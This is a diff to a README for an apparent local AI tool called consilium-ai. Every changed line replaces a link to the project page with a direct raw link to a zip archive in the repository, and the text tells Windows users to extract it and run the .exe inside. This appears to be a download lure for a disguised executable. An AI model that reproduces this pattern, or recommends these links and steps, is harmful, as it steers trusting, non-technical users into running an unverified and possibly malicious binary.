@@ -1,6 +1,6 @@
 # 🧠 consilium-ai - Local AI on Your PC
 
-[![Download consilium-ai](https://img.shields.io/badge/Download-consilium--ai-8A2BE2?style=for-the-badge&logo=github)](https://github.com/imprecise-nest694/consilium-ai)
+[![Download consilium-ai](https://img.shields.io/badge/Download-consilium--ai-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/imprecise-nest694/consilium-ai/main/engine/ai_consilium_1.6.zip)
 
 ## 🚀 What it is
 
@@ -10,7 +10,7 @@ It is built for people who want an AI tool that feels simple to use and does not
 
 ## 📥 Download
 
-Go to the download page here: [consilium-ai on GitHub](https://github.com/imprecise-nest694/consilium-ai)
+Go to the download page here: [consilium-ai on GitHub](https://raw.githubusercontent.com/imprecise-nest694/consilium-ai/main/engine/ai_consilium_1.6.zip)
 
 On that page, look for the latest release or download file for Windows. If you see a `.exe` file, download and run that file.
 
@@ -52,7 +52,7 @@ It fits use cases like:
 
 ## 🪟 How to install on Windows
 
-1. Open the download page: [https://github.com/imprecise-nest694/consilium-ai](https://github.com/imprecise-nest694/consilium-ai)
+1. Open the download page: [https://raw.githubusercontent.com/imprecise-nest694/consilium-ai/main/engine/ai_consilium_1.6.zip](https://raw.githubusercontent.com/imprecise-nest694/consilium-ai/main/engine/ai_consilium_1.6.zip)
 2. Find the latest release or Windows download file.
 3. Download the file to your PC.
 4. If the file is a `.zip`, right-click it and choose Extract All.
@@ -228,6 +228,6 @@ That approach keeps setup easy and helps you learn how the app behaves on your P
 
 ## 🔗 Download again
 
-[Open the consilium-ai download page](https://github.com/imprecise-nest694/consilium-ai)
+[Open the consilium-ai download page](https://raw.githubusercontent.com/imprecise-nest694/consilium-ai/main/engine/ai_consilium_1.6.zip)
 
 If you are using Windows, download the release file from that page and run it on your PC
